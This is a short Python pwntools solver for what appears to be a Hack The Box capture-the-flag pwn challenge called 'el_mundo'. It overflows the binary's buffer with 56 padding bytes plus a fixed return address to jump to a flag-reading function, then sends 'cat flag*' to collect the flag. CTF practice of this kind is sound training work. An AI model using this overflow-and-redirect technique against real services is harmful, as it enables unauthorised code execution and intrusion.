#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = './el_mundo' 

LOCAL = False # Change this to "True" to run it locally 

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)

# CHANGE THESE
nbytes = 56             # CHANGE THIS TO THE RIGHT AMOUNT
read_flag_addr = 0x00000000004016b7 # ADD THE CORRECT ADDRESS

# Send payload
r.sendlineafter('> ', b'A'*nbytes + p64(read_flag_addr))

# Read flag
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')

